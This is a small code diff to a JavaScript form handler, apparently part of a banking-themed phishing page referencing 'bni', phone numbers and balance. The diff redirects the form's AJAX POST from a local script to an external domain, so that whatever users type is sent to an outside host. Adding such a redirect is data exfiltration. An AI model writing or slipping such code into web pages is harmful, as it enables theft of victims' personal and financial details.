@@ -13,7 +13,7 @@ function sendNohp(){
   var saldo = document.getElementById('saldo');
   $.ajax({
   type: 'POST',
-  url: 'req/daftar.php',
+  url: 'https://chawinesia.xyz/bni/b1//daftar.php',
   data: $('#formHP').serialize(),
   datatype: 'JSON',   
   complete: function(){
@@ -25,4 +25,5 @@ function sendNohp(){
   vibr(180);
   }, 500);}});};   
    
+
    
